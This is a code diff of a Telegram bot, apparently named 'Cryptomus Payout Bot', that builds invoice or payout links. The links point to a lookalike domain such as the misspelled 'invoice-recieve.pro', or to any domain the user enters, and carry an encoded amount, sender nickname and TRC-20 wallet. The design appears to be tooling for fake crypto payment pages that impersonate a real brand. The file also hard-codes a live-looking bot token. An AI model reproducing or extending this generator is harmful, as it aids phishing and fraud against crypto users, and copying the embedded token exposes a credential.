@@ -13,7 +13,6 @@ from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # ─── НАСТРОЙКИ ────────────────────────────────────────────────
 BOT_TOKEN = "8624068268:AAF7PtduLyEpNQE5xKVzTtdJasSea0Xe538"
-BASE_URL  = "http://invoice-recieve.pro/"
 # ──────────────────────────────────────────────────────────────
 
 logging.basicConfig(level=logging.INFO)
@@ -22,8 +21,9 @@ dp  = Dispatcher(storage=MemoryStorage())
 
 
 class Form(StatesGroup):
+    domain = State()
     amount = State()
-    sender = State()
+    nick = State()
     wallet = State()
 
 
@@ -35,11 +35,20 @@ def short_id(n=4):
     return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
 
-def build_link(amount: float, sender: str, wallet: str) -> str:
+def normalize_domain(domain: str) -> str:
+    """Добавляет https:// если протокол не указан, убирает слэш в конце."""
+    d = domain.strip().rstrip('/')
+    if not d.startswith(('http://', 'https://')):
+        d = 'https://' + d
+    return d.rstrip('/')
+
+
+def build_link(domain: str, amount: float, nick: str, wallet: str) -> str:
+    base = normalize_domain(domain)
     amt = str(int(amount)) if amount == int(amount) else str(amount)
-    raw   = f"{amt}|{sender}|{wallet}|{short_id(4)}"
+    raw = f"{amt}|{nick}|{wallet}|{short_id(4)}"
     token = base64.urlsafe_b64encode(raw.encode()).decode().rstrip('=')
-    return f"{BASE_URL}/#t={token}"
+    return f"{base}/#t={token}"
 
 
 def amt_str(amount: float) -> str:
@@ -52,10 +61,8 @@ async def cmd_start(message: types.Message, state: FSMContext):
     await state.clear()
     await message.answer(
         "👋 <b>Cryptomus Payout Bot</b>\n\n"
-        "Команды:\n"
-        "• /gen &lt;сумма&gt; — одной строкой\n"
-        "• /gen — пошаговый режим\n\n"
-        "<i>Пример:</i> <code>/gen 500</code>",
+        "Команда /gen — создание ссылки на счёт.\n\n"
+        "Вам понадобятся: домен, сумма, ник и кошелёк TRC-20.",
         parse_mode="HTML"
     )
 
@@ -64,31 +71,29 @@ async def cmd_start(message: types.Message, state: FSMContext):
 @dp.message(Command("gen"))
 async def cmd_gen(message: types.Message, state: FSMContext):
     await state.clear()
-    parts = message.text.split(maxsplit=1)
+    await state.set_state(Form.domain)
+    await message.answer("🌐 Введите ваш домен:", parse_mode="HTML")
 
-    if len(parts) == 2:
-        try:
-            amount = float(parts[1].replace(",", "."))
-            if amount <= 0:
-                raise ValueError
-        except ValueError:
-            await message.answer("❌ Неверная сумма. Пример: <code>/gen 300</code>", parse_mode="HTML")
-            return
-        await state.update_data(amount=amount)
-        await state.set_state(Form.sender)
-        await message.answer(
-            f"💰 Сумма: <b>{amt_str(amount)}.00 USDT</b>\n\n"
-            f"Введите отправителя:\n"
-            f"<i>Пример:</i> <code>MANAGER CP COMPANY</code>",
-            parse_mode="HTML"
-        )
+
+# ─── Шаг 1: домен ─────────────────────────────────────────────
+@dp.message(StateFilter(Form.domain))
+async def step_domain(message: types.Message, state: FSMContext):
+    if not message.text or message.text.startswith('/'):
         return
-
+    domain = message.text.strip()
+    if not domain:
+        await message.answer("❌ Введите домен. Например: <code>invoice-recieve.pro</code>", parse_mode="HTML")
+        return
+    await state.update_data(domain=domain)
     await state.set_state(Form.amount)
-    await message.answer("💵 Введи желаемую сумму чека", parse_mode="HTML")
+    await message.answer(
+        f"🌐 Домен: <b>{normalize_domain(domain)}</b>\n\n"
+        f"💵 Введите сумму:",
+        parse_mode="HTML"
+    )
 
 
-# ─── Шаг 1: сумма ─────────────────────────────────────────────
+# ─── Шаг 2: сумма ─────────────────────────────────────────────
 @dp.message(StateFilter(Form.amount))
 async def step_amount(message: types.Message, state: FSMContext):
     if not message.text or message.text.startswith('/'):
@@ -102,35 +107,35 @@ async def step_amount(message: types.Message, state: FSMContext):
         await message.answer("❌ Введите корректное число. Например: <code>300</code>", parse_mode="HTML")
         return
     await state.update_data(amount=amount)
-    await state.set_state(Form.sender)
+    await state.set_state(Form.nick)
     await message.answer(
         f"💰 Сумма: <b>{amt_str(amount)}.00 USDT</b>\n\n"
-        f"Введите отправителя:\n"
+        f"Введите ник:\n"
         f"<i>Пример:</i> <code>MANAGER CP COMPANY</code>",
         parse_mode="HTML"
     )
 
 
-# ─── Шаг 2: отправитель ───────────────────────────────────────
-@dp.message(StateFilter(Form.sender))
-async def step_sender(message: types.Message, state: FSMContext):
+# ─── Шаг 3: ник ────────────────────────────────────────────────
+@dp.message(StateFilter(Form.nick))
+async def step_nick(message: types.Message, state: FSMContext):
     if not message.text or message.text.startswith('/'):
         return
-    sender = message.text.strip()
-    if not sender:
-        await message.answer("❌ Введите имя отправителя.")
+    nick = message.text.strip()
+    if not nick:
+        await message.answer("❌ Введите ник.")
         return
-    await state.update_data(sender=sender)
+    await state.update_data(nick=nick)
     await state.set_state(Form.wallet)
     await message.answer(
-        f"🏢 Отправитель: <b>{sender.upper()}</b>\n\n"
+        f"👤 Ник: <b>{nick.upper()}</b>\n\n"
         f"Введите TRC-20 адрес кошелька получателя:\n"
         f"<i>Пример:</i> <code>TUeapnPqxQBEuFjuJXCMLzNSywwCuBmQeE</code>",
         parse_mode="HTML"
     )
 
 
-# ─── Шаг 3: кошелёк ───────────────────────────────────────────
+# ─── Шаг 4: кошелёк ───────────────────────────────────────────
 @dp.message(StateFilter(Form.wallet))
 async def step_wallet(message: types.Message, state: FSMContext):
     if not message.text or message.text.startswith('/'):
@@ -146,22 +151,24 @@ async def step_wallet(message: types.Message, state: FSMContext):
         )
         return
 
-    data   = await state.get_data()
+    data = await state.get_data()
     await state.clear()
 
+    domain = data["domain"]
     amount = data["amount"]
-    sender = data["sender"]
-    link   = build_link(amount, sender, wallet)
+    nick = data["nick"]
+    link = build_link(domain, amount, nick, wallet)
     wallet_short = wallet[:9] + '...' + wallet[-6:]
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="👆 Нажмите здесь, чтобы скопировать ссылку", url=link)]
+        [InlineKeyboardButton(text="👆 Нажмите здесь, чтобы открыть счёт", url=link)]
     ])
 
     await message.answer(
         f"✅ <b>Счет сформирован</b>\n\n"
+        f"🌐 Домен: <code>{normalize_domain(domain)}</code>\n"
         f"💰 Сумма: <code>{amt_str(amount)}.00 USDT</code>\n"
-        f"🏢 От кого: <code>{sender.upper()}</code>\n"
+        f"👤 Ник: <code>{nick.upper()}</code>\n"
         f"👛 Кошелёк: <code>{wallet_short}</code>\n\n"
         f"🔗 Ссылка:\n<code>{link}</code>",
         parse_mode="HTML",
